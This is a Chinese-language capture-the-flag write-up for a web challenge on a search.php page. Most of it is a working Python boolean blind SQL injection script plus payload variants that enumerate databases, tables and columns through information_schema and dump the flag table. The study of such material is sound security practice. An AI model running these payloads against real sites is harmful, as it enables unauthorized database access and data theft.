![[Pasted image 20221214145735.png|400]]

---
首页长这样
![[Pasted image 20221214145759.png|700]]
`flag`是不可能白送的，这辈子都是不可能白送的.jpg

点击数字之后访问
```php
/search.php?id=xxx
```
对于无效数字，响应是
![[Pasted image 20221214145910.png]]

使用布尔盲注来获取数据库信息
```python
import requests
import time
import sys

url = "http://xxx.node4.buuoj.cn:81/search.php"

fmt = '0^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)'
false_re = 'ERROR'

for i in range(1, 200):
    l = 0
    r = 127
    while l < r:
        mid = (l + r) // 2
        payload = fmt % (i, mid)
        params = {'id': payload}
        response = requests.get(url, params)
        time.sleep(0.2)
        if response.text.find(false_re) >= 0: # mid >= ans
            r = mid
        else: # mid < ans
            l = mid + 1
    print(chr(l), end='')
    sys.stdout.flush()

```
`buuoj`这个429好严QAQ
![[Pasted image 20221214150250.png]]

修改`fmt`来爆`geek`数据库的表
```python
fmt = '0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=\'geek\')),%d,1))>%d)'
```
![[Pasted image 20221214150608.png]]

再次修改`fmt`来获取两张表的列
```python
fmt = '0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\'F1naI1y\')),%d,1))>%d)'
fmt = '0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\'Flaaaaag\')),%d,1))>%d)'
```
![[Pasted image 20221214150759.png]]
![[Pasted image 20221214150844.png]]

胜利近在咫尺
```python
fmt = '0^(ord(substr((select(group_concat(fl4gawsl))from(geek.Flaaaaag)),%d,1))>%d)'
```
![[Pasted image 20221214151723.png]]
![[Pasted image 20221214151710.png|700]]
谢谢有被出题人问候到
被骗了，这个表存的好像是问候语
```python
fmt = '0^(ord(substr((select(group_concat(password))from(geek.F1naI1y)),%d,1))>%d)'
```
![[Pasted image 20221214152922.png]]
出离愤怒😡
![[Pasted image 20221214153534.png]]
#Web #SQL注入 #布尔盲注 